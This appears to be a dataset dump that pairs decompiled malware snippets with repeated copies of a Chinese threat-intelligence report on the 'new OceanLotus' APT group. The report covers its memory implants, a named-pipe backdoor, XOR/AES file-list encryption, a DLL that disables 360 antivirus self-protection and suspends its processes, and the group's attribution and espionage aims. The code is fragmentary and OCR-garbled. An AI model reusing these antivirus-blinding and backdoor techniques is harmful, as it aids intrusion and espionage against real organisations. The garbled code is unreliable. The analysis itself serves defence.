GetCurrentProcess();GetModuleBaseNameA(v0, 0, String1, 260);return lstrcmpA(String1, \"360Baobiao.exe\") == 0;  \n\nDLL的主要功能通过DeviceIOctontol关闭自保。\n\n<--- Page Split --->\n\nhDevice = hObject; \n\nif (!hObject) \n\n{ v1 = sub_6BAC1530(); \n\nif (!v1) return v1; \n\nBytesReturned = 0; InBuffer[0] = 0; \n\nv1 = DeviceIoControl(hDevic if (!v1) \n\nCloseHandle(hObject); hObject = 0; \n\n之后休眠 zhudongfangyu.exe 和 360rps.exe 进程，实现致盲的效果。\n\n<--- Page Split --->\n\n41 } while（v3！ \\(= \\vee 4\\) ）; 43 1 if（lstrcmpw(L\"ZHUDONGFANGYU.EXE\",pe.szExeFile)&&lstrcmpw(L\"36ORPS.EXE\",pe.szExeFile)） 45 1 if（!lstrcmpw(\"3\",pe.szExeFile) 47 1!lstrcmpw(&word_6BAC4102,pe.szExeFile) 48 1!lstrcmpw(&word_6BAC4116,pe.szExeFile)） 49 1 v12[v10++]=pe.th32ProcessID; 50 1 51 52 1 else 53 1 v11[v1++]=pe.th32ProcessID; 54 1 55 1 56 1 57 1 while（Process32NextW(v9,&pe）); 58 CloseHandle(v9); 59 if（v1） 60 1 61 { 62 v6=0; 63 while（sub_6BAC16C0(v11[v6])） 64 { 65 if（++v6==v1）  \n\n目前该手法已经无效。  \n\n## UTC+7  \n\n上述复杂的内存TTP似乎只是“昙花一现”，从2023年12月份新海莲花转入不活跃状态之后，我们就再也没有观察到类似的技战术，在此之后2024年3月老海莲花继承了其攻击资源又发起了两波0day供应链事件，并让我们最终确认攻击者位于UTC+7时区，海莲花通过一些渠道购买国内VPS服务器将其当作代理一直在请求目标单位的终端管理服务器并挑选要入侵的目标人员。（不止海莲花，在2024年我们观察到几乎所有方向的APT组织都在通过代理公司或者黑产四件套来购买国内VPS厂商的资源，将其当作代理和C2，甚至还有找国内人员给木马后门代签数字签名的行为，APT已经深度融入国内黑灰产上下游中，我们建议对国内下游人员进行打击，将这些通道彻底遏制）。  \n\n在UTC+8的时区下，基于天眼设备可以观察到攻击者每天从早上十点一直工作到晚上19- 20点，标准的八小时工作制，到点下班有双休，与国内红队的工作强度相比不太饱和，攻击者唯独在4月18号这一天缺勤，并且第二天“上班\"时间较晚。  \n\n![](images/9_0.jpg)\n  \n\n经过搜索发现4月18号为东南亚某国的法定节假日，称之为“雄王节”（Hung Kings/ Giõ Tô Hùng Vương）。\n\n<--- Page Split --->\n\n## 目的  \n\n目前已经确认攻击者位于东南亚国家，假设其为所在国提供情报服务。在研究其目的时，我们仅挑选终端服务器定向下发的案例来研究，因为攻击者在终端服务器上可以看到目标单位所有的组织架构和人员信息，其挑选的目标终端必然具有定向性，而其他的间谍活动比如批量入侵防火墙、web服务等都是非定向性的，无法作为研究的数据源。  \n\n我们整理了2021- 2024年间数起终端下发事件，大部分情况下其目标都聚焦在西南省份的环境和交通数据，以及我国在东亚的能源部署，这些都符合东南亚国家的利益，转折点在新海莲花出现之后，2023- 2024年大规模刺探我国能源、军工领域在中亚、中东、北亚、非洲的项目和部署情况，受害终端上甚至包含向境外派遣的人员名单，这些数据并不是东南亚小国能够消化完的，更像是域外大国关注的领域，而新海莲花组织出现的时间又恰好和东南亚某国与域外大国达成网络安全合作的时间点相吻合。  \n\n以上只是我们作为网络安全厂商所观察到的事实的陈述，不针对任何国家和个人。  \n\n## 总结  \n\n目前，基于奇安信威胁情报中心的威胁情报数据的全线产品，包括奇安信威胁情报平台（TIP）、天擎、天眼高级威胁检测系统、奇安信NGSOC、奇安信态势感知等，都已经支持对此类攻击的精确检测。  \n\n## 参考链接  \n\n[1].https://ti.qianxin.com/blog/articles/new%20-trend-in-msi-file-abuse-new-oceanlotus-group-first-to-use- mst-files-to-deliver-special-trojan-cn/  \n\n[2].https://mp.weixin.qq.com/s/3bmehaRuvaL5TnvdZXwYWA  \n\n东南亚地区APT海莲花  \n\n分享到：\n\n<--- Page Split --->", "format_code": "v25=v6^v8^0x2B48;v26=(v6^v8^0x6C502B48)>>16;v27=(v6^v8^0x6C502B48)>>24;sub_141D40(&v22,v23,(int)&v25,(int)v28,(int)v7);if(v8){sub_141D40(&v22,v23,(int)v29,(int)&v29[v8],(int)v29);v9=v30;v10=*(_DWORD*)(v30+320);v11=v8+v10;if(v10!=v8+v10){v12=*(_DWORD*)(v30+324)-v11;sub_145290(v10,v11,v12);*(DWORD*)(v9+324)=v12+v10;", "hash_code": "948d3cb10e280eef0d2fdfa886a8062b542b2f44383a2baa7c2fef035e28fddb", "hash": "hash"}
{"file_name": "0e2dd674-5079-48d3-91c0-057e4498035b_APT32.md", "title": "默认标题", "malicious_code": "hDevice = hObject; \nif (!hObject) \n{ v1 = sub_6BAC1530(); \nif (!v1) return v1; \nBytesReturned = 0; InBuffer[0] = 0; \nv1 = DeviceIoControl(hDevic if (!v1) \nCloseHandle(hObject); hObject = 0;", "describe": "## Unknown Title  \n\n## 返回TI主页  \n\nRESEARCH  \n\n数据驱动安全  \n\n## 概述  \n\n新海莲花组织最早出现于2022年中，直到2023年底转入不活跃状态，2024年11月重新活跃并被我们快速制止披露[1]，在2023年全年新海莲花组织展示出于以往完全不同的技战术，进攻水平也比之前提升很多，使用多个0day漏洞针对我国军工、能源、航空等领域开展间谍活动，意图窃取我国能源和军工领域在中东、中亚、非洲、东亚的部署情况。  \n\n本文仅作为安全研究，我们不关注初始样本载荷，主要披露新海莲花组织内存插件和间谍目的，天擎EDR可以在内存中精准告警新海莲花组织所有内存插件，我们建议政企客户启用云查功能来发现未知威胁。  \n\n## 奇安信天擎提醒|内存攻击防护发现程序正在执行可疑内存代码，建议阻止  \n\n可疑程序：自C:\\Users\\Adminis...llCodeLoader.exe可疑来源：C:\\Windows\\System32\\cmd.exe  \n\n内存攻击是指利用Shellcode执行恶意代码  \n\n![](images/0_0.jpg)\n  \n\n不再提醒  \n\n允许  \n\n立即阻止(20)  \n\n## 内存技战术\n\n<--- Page Split --->\n\n新海莲花组织通过终端软件0day漏洞向内网特定终端下发恶意更新，实现供应链攻击，在目前国内错综复杂的安全产品生态下这种攻击模式是所有APT组织的最优解，并不是海莲花组织独有的手法[2]，我们甚至观察到针对国内的勒索软件运营商也有类似的操作，区别在于勒索运营商会向全内网终端下发勒索软件，而APT组织则是选择特定的目标终端后下发，新海莲花组织内存技战术如下：  \n\n![](images/1_0.jpg)\n  \n\n新海莲花组织在2022- 2023年所使用的CobaltStrike有一个非常明显的特征：  \n\n木马运行后会自动将当前的屏幕截图保存为PNG格式并发送到C2服务器上，如果恰好此时攻击者正处于RDP的状态，那么就能在受害者机器上得到一张攻击者双击木马程序的照片：  \n\n![](images/1_1.jpg)\n  \n\nCobalt Strike注入到系统进程后会在当前进程中内存加载Rust特马并回连新的C2，Rust特马的分析友商已经有过分析，故不再赘述。接着通过ProcessHollowing的方式将文件目录收集插件注入到系统进程中。\n\n<--- Page Split --->\n\nv9 = v24(v54, 0x80000000164, 1i64, 0i64, 3, 128, 0i64); // CreateFileW // L\"C:\\\\Users\\\\ADMINI- 1\\\\AppData\\\\Local\\\\Temp\\\\5fff4bed- 85ea- 4ba1- 8795- v10 = v27(v9, 0i64); // GetFileSize v55 = v10; if (v10) { v11 = v10; v12 = v20(0i64, v10, 12288164, 4i64); // VirtualAlloc v13 = (_BYTE \\*)v12; if (v12) { if (v26(v9, v12, v55, &v55, 0i64)) // ReadFile { v25(v9); // CloseHandle v30(v54); // DeleteFileW  \n\n将读取到的内容重新与0xF1解密后，重新进行加密。  \n\n加密算法为128位AES算法。  \n\n\\(\\begin{array}{rl} & {\\{\\\\ & {(*(\\mathrm{void}(\\_ \\mathrm{fastcall}**)(\\mathrm{char}*,\\_ \\mathrm{int64},\\_ \\mathrm{int64}))(\\mathrm{a1} + 144))(\\mathrm{v29},\\mathrm{a2},\\mathrm{16i64});//\\mathrm{memcpy}}\\\\ & {\\mathrm{if}((\\mathrm{*}(\\mathrm{unsignedint}(\\_ \\mathrm{fastcall}**)(\\mathrm{int64},\\mathrm{int}*,\\_ \\mathrm{int64},\\_ \\mathrm{QWORD},\\_ \\mathrm{DWORD},\\_ \\mathrm{int64}*)))(\\mathrm{a1} + 16))((//\\mathrm{CryptImportKey}\\\\ & {\\mathrm{v27},\\\\ & {\\mathrm{v28},\\\\ & {\\mathrm{28i64},\\\\ & {\\mathrm{0i64},\\\\ & {\\mathrm{0},\\\\ & {\\mathrm{&v26}})\\}}\\\\ & {\\mathrm{}}}\\\\ & {\\mathrm{}} \\end{array}\\)  \n\n最后将加密的内容再与0xF2异或后写入文件C:\\Programdata\\SogouInput.xml中。  \n\ndo { \\*v13++ ^= 0xF2u; - - v14; } while ( v14 ); } if ((unsigned int)sub_20F1246(v20, a6, v12)) // writefile // C:\\\\Programdata\\\\SogouInput.xml  \n\n攻击者会在后端对xml文件进行分析，最终挑选出窃取的目标文件，偷完文档后攻击者如果选择进一步横向移动，一般会通过ProcessHollowing的方式将管道特马注入到系统进程中。  \n\n## 管道特马（内存态）  \n\n该管道特马所在的内存块固定大小0x35000，创建名为\\\\\\\\.pipe\\InitStarts的管道循环监听。\n\n<--- Page Split --->\n\n\n<table><tr><td>0014113C</td><td>56</td><td>push esi</td><td></td></tr><tr><td>0014113D</td><td>52</td><td>push edx</td><td></td></tr><tr><td>0014113E</td><td>6A 03</td><td>push 0x3</td><td></td></tr><tr><td>0014114D</td><td>68 90471500</td><td>push 0x154790</td><td>UNICODE \"\\\\.\\pipe\\InitStarts&quot;</td></tr><tr><td>00141145</td><td>FF15 08E01400</td><td>call dword ptr ds:[0x14E008]</td><td>kernel32.CreateNamedPipeW</td></tr><tr><td>0014114B</td><td>8BF0</td><td>mov esi,eax</td><td></td></tr><tr><td>0014114D</td><td>85F6</td><td>test esi,esi</td><td></td></tr><tr><td>0014114F</td><td>74 10</td><td>test short 00141161</td><td></td></tr><tr><td>00141151</td><td>6A 00</td><td>push 0x0</td><td></td></tr><tr><td>00141153</td><td>56</td><td>push esi</td><td></td></tr><tr><td>00141154</td><td>FF15 0CE01400</td><td>call dword ptr ds:[0x14E00C]</td><td>kernel32.ConnectNamedPipe</td></tr><tr><td>0014115A</td><td>85C0</td><td>test eax,eax</td><td></td></tr><tr><td>0014115C</td><td>75 15</td><td>int short 00141173</td><td></td></tr><tr><td>0014115E</td><td>56</td><td>push esi</td><td></td></tr><tr><td>0014115F</td><td>FFD3</td><td>call ebx</td><td>kernel32.CloseHandle</td></tr><tr><td>00141161</td><td>57</td><td>push edi</td><td></td></tr><tr><td>00141162</td><td>FF15 14E01400</td><td>call dword ptr ds:[0x14E014]</td><td>kernel32.Sleep</td></tr></table>  \n\n读取管道中的数据：  \n\n![](images/3_0.jpg)\n  \n\n通信过程中定义了一个结构体，创建线程并将结构体当作参数传入。\n\n<--- Page Split --->\n\n\\(\\begin{array}{rl} & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{v}6 + 308) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 312) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{OR} *)(\\mathrm{V}6 + 316) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 320) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{OR} *)(\\mathrm{V}6 + 324) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 328) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{OR} *)(\\mathrm{V}6 + 8) = \\boxed {\\mathrm{V}};}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)\\mathrm{v}6 = 1;}\\\\ & {\\mathrm{kernel}32\\_ \\mathrm{InterlockedIncrement}(\\mathrm{v}9);}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 4) = \\mathrm{v}15;}\\\\ & {\\mathrm{ntdl}1\\_ \\mathrm{Rt} \\mathrm{InitializeCriticalSection}(\\mathrm{v}6 + 12);}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 300) = \\emptyset \\times 40000;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 304) = 11 * \\mathrm{kernel}32\\_ \\mathrm{GetCurrentProcessId}();}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 304) = 11 * \\mathrm{kernel}32\\_ \\mathrm{GetCurrentThreadId}();}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 304) + = \\mathrm{kernel}32\\_ \\mathrm{GetTickCount}();}\\\\ & {*(\\_ \\mathrm{BYTE} *)(\\mathrm{V}6 + 296) = 1;}\\\\ & {\\mathrm{kernel}32\\_ \\mathrm{InterlockedIncrement}(\\mathrm{v}6);}\\\\ & {\\mathrm{i} = \\emptyset ;}\\\\ & {\\mathrm{v}7 = \\mathrm{kernel}32\\_ \\mathrm{CreateThread}(\\emptyset , \\emptyset \\times 20000, \\emptyset \\times 141860, \\mathrm{v}6, \\emptyset , \\& \\mathrm{i});}\\\\ & {\\mathrm{if} (\\mathrm{v}7)}\\\\ & {\\{\\\\ & \\mathrm{kernel}32\\_ \\mathrm{CloseHandle}(\\mathrm{v}7);}\\\\ & {\\mathrm{return} \\mathrm{v}6;}\\\\ & {\\}}\\\\ & {\\mathrm{else}} \\end{array}\\)  \n\n该线程会持续读取管道中的数据，并将数据解密后传递给工作线程，同时获取工作线程执行后的数据再解密传输到管道中。  \n\n2 3 4 5 6 7 8 9 10 11 12  \n\n加密算法如下：\n\n<--- Page Split --->\n\nv4 = \\*(_DWORD \\*) (this + 300);v23 = 0;v24 = 0;v5 = (v3 \\* v3 \\* v3 + 18) % 0xB8A5u;v6 = (unsigned __int8)v5;*(_DWORD \\*) (this + 304) = v5;v26 = 0;v27 = 0;v25 = (unsigned __int8)v5;sub_141D40(&v22, 0, (int)&v25, (int)v28, (int)v21);ntdll_RtlEnterCriticalSection(this + 12);v7 = \\*(char \\*\\*) (this + 320);v8 = \\*(_DWORD \\*) (this + 324) - (_DWORD)v7;v29 = v7;if (v4 <= v8)v8 = v4;v25 = v6 ^ v8 ^ 0x2B48;v26 = (v6 ^ v8 ^ 0x6C502B48) >> 16;v27 = (v6 ^ v8 ^ 0x6C502B48) >> 24;sub_141D40(&v22, v23, (int)&v25, (int)v28, (int)v7);if (v8){sub_141D40(&v22, v23, (int)v29, (int)&v29[v8], (int)v29);v9 = v30;v10 = \\*(_DWORD \\*) (v30 + 320);v11 = v8 + v10;if (v10 != v8 + v10){v12 = \\*(_DWORD \\*) (v30 + 324) - v11;sub_145290(v10, v11, v12);\\*(_DWORD \\*) (v9 + 324) = v12 + v10;  \n\n工作线程中有大量的功能性函数，例如：文件管理、shellcode加载、命令执行等。\n\n<--- Page Split --->\n\n密码为弱口令，可以推测攻击者是通过爆破的方式获取到服务器密码。  \n\n![](images/6_0.jpg)\n  \n\n通过 history 日志可以确认攻击者在浏览服务器上的目录并打包数据。  \n\n## 双平台特马（内存态）  \n\n新海莲花组织在入侵边界服务器时如：web 服务器、防火墙等设备会使用一款 Win | linux 双平台的特马，该特马最早在防火墙上被发现，很长一段时间内我们认为该特马只在边界服务器上部署，但是在一次对抗的过程中发现该特马被注入到 windows 的系统进程中，并且注入时间距离 Cobalt Strike 的植入时间晚一周。\n\n<--- Page Split --->\n\nHANDLE v0; // eaxCHAR String1[272]; // [esp+1Ch] [ebp- 110h] BYREF  \n\nmemset(String1, 0, 0x104u);v0 = GetCurrentProcess();GetModuleBaseNameA(v0, 0, String1, 260);return lstrcmpA(String1, \"360Baobiao.exe\") == 0;  \n\nDLL的主要功能通过DeviceIOctontol关闭自保。\n\n<--- Page Split --->\n\nhDevice = hObject; \n\nif (!hObject) \n\n{ v1 = sub_6BAC1530(); \n\nif (!v1) return v1; \n\nBytesReturned = 0; InBuffer[0] = 0; \n\nv1 = DeviceIoControl(hDevic if (!v1) \n\nCloseHandle(hObject); hObject = 0; \n\n之后休眠 zhudongfangyu.exe 和 360rps.exe 进程，实现致盲的效果。\n\n<--- Page Split --->\n\n41 } while（v3！ \\(= \\vee 4\\) ）; 43 1 if（lstrcmpw(L\"ZHUDONGFANGYU.EXE\",pe.szExeFile)&&lstrcmpw(L\"36ORPS.EXE\",pe.szExeFile)） 45 1 if（!lstrcmpw(\"3\",pe.szExeFile) 47 1!lstrcmpw(&word_6BAC4102,pe.szExeFile) 48 1!lstrcmpw(&word_6BAC4116,pe.szExeFile)） 49 1 v12[v10++]=pe.th32ProcessID; 50 1 51 52 1 else 53 1 v11[v1++]=pe.th32ProcessID; 54 1 55 1 56 1 57 1 while（Process32NextW(v9,&pe）); 58 CloseHandle(v9); 59 if（v1） 60 1 61 { 62 v6=0; 63 while（sub_6BAC16C0(v11[v6])） 64 { 65 if（++v6==v1）  \n\n目前该手法已经无效。  \n\n## UTC+7  \n\n上述复杂的内存TTP似乎只是“昙花一现”，从2023年12月份新海莲花转入不活跃状态之后，我们就再也没有观察到类似的技战术，在此之后2024年3月老海莲花继承了其攻击资源又发起了两波0day供应链事件，并让我们最终确认攻击者位于UTC+7时区，海莲花通过一些渠道购买国内VPS服务器将其当作代理一直在请求目标单位的终端管理服务器并挑选要入侵的目标人员。（不止海莲花，在2024年我们观察到几乎所有方向的APT组织都在通过代理公司或者黑产四件套来购买国内VPS厂商的资源，将其当作代理和C2，甚至还有找国内人员给木马后门代签数字签名的行为，APT已经深度融入国内黑灰产上下游中，我们建议对国内下游人员进行打击，将这些通道彻底遏制）。  \n\n在UTC+8的时区下，基于天眼设备可以观察到攻击者每天从早上十点一直工作到晚上19- 20点，标准的八小时工作制，到点下班有双休，与国内红队的工作强度相比不太饱和，攻击者唯独在4月18号这一天缺勤，并且第二天“上班\"时间较晚。  \n\n![](images/9_0.jpg)\n  \n\n经过搜索发现4月18号为东南亚某国的法定节假日，称之为“雄王节”（Hung Kings/ Giõ Tô Hùng Vương）。\n\n<--- Page Split --->\n\n## 目的  \n\n目前已经确认攻击者位于东南亚国家，假设其为所在国提供情报服务。在研究其目的时，我们仅挑选终端服务器定向下发的案例来研究，因为攻击者在终端服务器上可以看到目标单位所有的组织架构和人员信息，其挑选的目标终端必然具有定向性，而其他的间谍活动比如批量入侵防火墙、web服务等都是非定向性的，无法作为研究的数据源。  \n\n我们整理了2021- 2024年间数起终端下发事件，大部分情况下其目标都聚焦在西南省份的环境和交通数据，以及我国在东亚的能源部署，这些都符合东南亚国家的利益，转折点在新海莲花出现之后，2023- 2024年大规模刺探我国能源、军工领域在中亚、中东、北亚、非洲的项目和部署情况，受害终端上甚至包含向境外派遣的人员名单，这些数据并不是东南亚小国能够消化完的，更像是域外大国关注的领域，而新海莲花组织出现的时间又恰好和东南亚某国与域外大国达成网络安全合作的时间点相吻合。  \n\n以上只是我们作为网络安全厂商所观察到的事实的陈述，不针对任何国家和个人。  \n\n## 总结  \n\n目前，基于奇安信威胁情报中心的威胁情报数据的全线产品，包括奇安信威胁情报平台（TIP）、天擎、天眼高级威胁检测系统、奇安信NGSOC、奇安信态势感知等，都已经支持对此类攻击的精确检测。  \n\n## 参考链接  \n\n[1].https://ti.qianxin.com/blog/articles/new%20-trend-in-msi-file-abuse-new-oceanlotus-group-first-to-use- mst-files-to-deliver-special-trojan-cn/  \n\n[2].https://mp.weixin.qq.com/s/3bmehaRuvaL5TnvdZXwYWA  \n\n东南亚地区APT海莲花  \n\n分享到：\n\n<--- Page Split --->", "format_code": "hDevice=hObject;if(!hObject){v1=sub_6BAC1530();if(!v1)returnv1;BytesReturned=0;InBuffer[0]=0;v1=DeviceIoControl(hDevicif(!v1)CloseHandle(hObject);hObject=0;", "hash_code": "49eec5bd9c5a719412025720fecce485654b30e858c231a4277695572f734b00", "hash": "hash"}
{"file_name": "0e2dd674-5079-48d3-91c0-057e4498035b_APT32.md", "title": "默认标题", "malicious_code": "v12[v10++]=pe.th32ProcessID;\nv11[v1++]=pe.th32ProcessID;\nwhile(Process32NextW(v9,&pe));\nCloseHandle(v9);\nwhile(sub_6BAC16C0(v11[v6]))", "describe": "## Unknown Title  \n\n## 返回TI主页  \n\nRESEARCH  \n\n数据驱动安全  \n\n## 概述  \n\n新海莲花组织最早出现于2022年中，直到2023年底转入不活跃状态，2024年11月重新活跃并被我们快速制止披露[1]，在2023年全年新海莲花组织展示出于以往完全不同的技战术，进攻水平也比之前提升很多，使用多个0day漏洞针对我国军工、能源、航空等领域开展间谍活动，意图窃取我国能源和军工领域在中东、中亚、非洲、东亚的部署情况。  \n\n本文仅作为安全研究，我们不关注初始样本载荷，主要披露新海莲花组织内存插件和间谍目的，天擎EDR可以在内存中精准告警新海莲花组织所有内存插件，我们建议政企客户启用云查功能来发现未知威胁。  \n\n## 奇安信天擎提醒|内存攻击防护发现程序正在执行可疑内存代码，建议阻止  \n\n可疑程序：自C:\\Users\\Adminis...llCodeLoader.exe可疑来源：C:\\Windows\\System32\\cmd.exe  \n\n内存攻击是指利用Shellcode执行恶意代码  \n\n![](images/0_0.jpg)\n  \n\n不再提醒  \n\n允许  \n\n立即阻止(20)  \n\n## 内存技战术\n\n<--- Page Split --->\n\n新海莲花组织通过终端软件0day漏洞向内网特定终端下发恶意更新，实现供应链攻击，在目前国内错综复杂的安全产品生态下这种攻击模式是所有APT组织的最优解，并不是海莲花组织独有的手法[2]，我们甚至观察到针对国内的勒索软件运营商也有类似的操作，区别在于勒索运营商会向全内网终端下发勒索软件，而APT组织则是选择特定的目标终端后下发，新海莲花组织内存技战术如下：  \n\n![](images/1_0.jpg)\n  \n\n新海莲花组织在2022- 2023年所使用的CobaltStrike有一个非常明显的特征：  \n\n木马运行后会自动将当前的屏幕截图保存为PNG格式并发送到C2服务器上，如果恰好此时攻击者正处于RDP的状态，那么就能在受害者机器上得到一张攻击者双击木马程序的照片：  \n\n![](images/1_1.jpg)\n  \n\nCobalt Strike注入到系统进程后会在当前进程中内存加载Rust特马并回连新的C2，Rust特马的分析友商已经有过分析，故不再赘述。接着通过ProcessHollowing的方式将文件目录收集插件注入到系统进程中。\n\n<--- Page Split --->\n\nv9 = v24(v54, 0x80000000164, 1i64, 0i64, 3, 128, 0i64); // CreateFileW // L\"C:\\\\Users\\\\ADMINI- 1\\\\AppData\\\\Local\\\\Temp\\\\5fff4bed- 85ea- 4ba1- 8795- v10 = v27(v9, 0i64); // GetFileSize v55 = v10; if (v10) { v11 = v10; v12 = v20(0i64, v10, 12288164, 4i64); // VirtualAlloc v13 = (_BYTE \\*)v12; if (v12) { if (v26(v9, v12, v55, &v55, 0i64)) // ReadFile { v25(v9); // CloseHandle v30(v54); // DeleteFileW  \n\n将读取到的内容重新与0xF1解密后，重新进行加密。  \n\n加密算法为128位AES算法。  \n\n\\(\\begin{array}{rl} & {\\{\\\\ & {(*(\\mathrm{void}(\\_ \\mathrm{fastcall}**)(\\mathrm{char}*,\\_ \\mathrm{int64},\\_ \\mathrm{int64}))(\\mathrm{a1} + 144))(\\mathrm{v29},\\mathrm{a2},\\mathrm{16i64});//\\mathrm{memcpy}}\\\\ & {\\mathrm{if}((\\mathrm{*}(\\mathrm{unsignedint}(\\_ \\mathrm{fastcall}**)(\\mathrm{int64},\\mathrm{int}*,\\_ \\mathrm{int64},\\_ \\mathrm{QWORD},\\_ \\mathrm{DWORD},\\_ \\mathrm{int64}*)))(\\mathrm{a1} + 16))((//\\mathrm{CryptImportKey}\\\\ & {\\mathrm{v27},\\\\ & {\\mathrm{v28},\\\\ & {\\mathrm{28i64},\\\\ & {\\mathrm{0i64},\\\\ & {\\mathrm{0},\\\\ & {\\mathrm{&v26}})\\}}\\\\ & {\\mathrm{}}}\\\\ & {\\mathrm{}} \\end{array}\\)  \n\n最后将加密的内容再与0xF2异或后写入文件C:\\Programdata\\SogouInput.xml中。  \n\ndo { \\*v13++ ^= 0xF2u; - - v14; } while ( v14 ); } if ((unsigned int)sub_20F1246(v20, a6, v12)) // writefile // C:\\\\Programdata\\\\SogouInput.xml  \n\n攻击者会在后端对xml文件进行分析，最终挑选出窃取的目标文件，偷完文档后攻击者如果选择进一步横向移动，一般会通过ProcessHollowing的方式将管道特马注入到系统进程中。  \n\n## 管道特马（内存态）  \n\n该管道特马所在的内存块固定大小0x35000，创建名为\\\\\\\\.pipe\\InitStarts的管道循环监听。\n\n<--- Page Split --->\n\n\n<table><tr><td>0014113C</td><td>56</td><td>push esi</td><td></td></tr><tr><td>0014113D</td><td>52</td><td>push edx</td><td></td></tr><tr><td>0014113E</td><td>6A 03</td><td>push 0x3</td><td></td></tr><tr><td>0014114D</td><td>68 90471500</td><td>push 0x154790</td><td>UNICODE \"\\\\.\\pipe\\InitStarts&quot;</td></tr><tr><td>00141145</td><td>FF15 08E01400</td><td>call dword ptr ds:[0x14E008]</td><td>kernel32.CreateNamedPipeW</td></tr><tr><td>0014114B</td><td>8BF0</td><td>mov esi,eax</td><td></td></tr><tr><td>0014114D</td><td>85F6</td><td>test esi,esi</td><td></td></tr><tr><td>0014114F</td><td>74 10</td><td>test short 00141161</td><td></td></tr><tr><td>00141151</td><td>6A 00</td><td>push 0x0</td><td></td></tr><tr><td>00141153</td><td>56</td><td>push esi</td><td></td></tr><tr><td>00141154</td><td>FF15 0CE01400</td><td>call dword ptr ds:[0x14E00C]</td><td>kernel32.ConnectNamedPipe</td></tr><tr><td>0014115A</td><td>85C0</td><td>test eax,eax</td><td></td></tr><tr><td>0014115C</td><td>75 15</td><td>int short 00141173</td><td></td></tr><tr><td>0014115E</td><td>56</td><td>push esi</td><td></td></tr><tr><td>0014115F</td><td>FFD3</td><td>call ebx</td><td>kernel32.CloseHandle</td></tr><tr><td>00141161</td><td>57</td><td>push edi</td><td></td></tr><tr><td>00141162</td><td>FF15 14E01400</td><td>call dword ptr ds:[0x14E014]</td><td>kernel32.Sleep</td></tr></table>  \n\n读取管道中的数据：  \n\n![](images/3_0.jpg)\n  \n\n通信过程中定义了一个结构体，创建线程并将结构体当作参数传入。\n\n<--- Page Split --->\n\n\\(\\begin{array}{rl} & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{v}6 + 308) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 312) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{OR} *)(\\mathrm{V}6 + 316) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 320) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{OR} *)(\\mathrm{V}6 + 324) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 328) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{OR} *)(\\mathrm{V}6 + 8) = \\boxed {\\mathrm{V}};}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)\\mathrm{v}6 = 1;}\\\\ & {\\mathrm{kernel}32\\_ \\mathrm{InterlockedIncrement}(\\mathrm{v}9);}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 4) = \\mathrm{v}15;}\\\\ & {\\mathrm{ntdl}1\\_ \\mathrm{Rt} \\mathrm{InitializeCriticalSection}(\\mathrm{v}6 + 12);}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 300) = \\emptyset \\times 40000;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 304) = 11 * \\mathrm{kernel}32\\_ \\mathrm{GetCurrentProcessId}();}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 304) = 11 * \\mathrm{kernel}32\\_ \\mathrm{GetCurrentThreadId}();}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 304) + = \\mathrm{kernel}32\\_ \\mathrm{GetTickCount}();}\\\\ & {*(\\_ \\mathrm{BYTE} *)(\\mathrm{V}6 + 296) = 1;}\\\\ & {\\mathrm{kernel}32\\_ \\mathrm{InterlockedIncrement}(\\mathrm{v}6);}\\\\ & {\\mathrm{i} = \\emptyset ;}\\\\ & {\\mathrm{v}7 = \\mathrm{kernel}32\\_ \\mathrm{CreateThread}(\\emptyset , \\emptyset \\times 20000, \\emptyset \\times 141860, \\mathrm{v}6, \\emptyset , \\& \\mathrm{i});}\\\\ & {\\mathrm{if} (\\mathrm{v}7)}\\\\ & {\\{\\\\ & \\mathrm{kernel}32\\_ \\mathrm{CloseHandle}(\\mathrm{v}7);}\\\\ & {\\mathrm{return} \\mathrm{v}6;}\\\\ & {\\}}\\\\ & {\\mathrm{else}} \\end{array}\\)  \n\n该线程会持续读取管道中的数据，并将数据解密后传递给工作线程，同时获取工作线程执行后的数据再解密传输到管道中。  \n\n2 3 4 5 6 7 8 9 10 11 12  \n\n加密算法如下：\n\n<--- Page Split --->\n\nv4 = \\*(_DWORD \\*) (this + 300);v23 = 0;v24 = 0;v5 = (v3 \\* v3 \\* v3 + 18) % 0xB8A5u;v6 = (unsigned __int8)v5;*(_DWORD \\*) (this + 304) = v5;v26 = 0;v27 = 0;v25 = (unsigned __int8)v5;sub_141D40(&v22, 0, (int)&v25, (int)v28, (int)v21);ntdll_RtlEnterCriticalSection(this + 12);v7 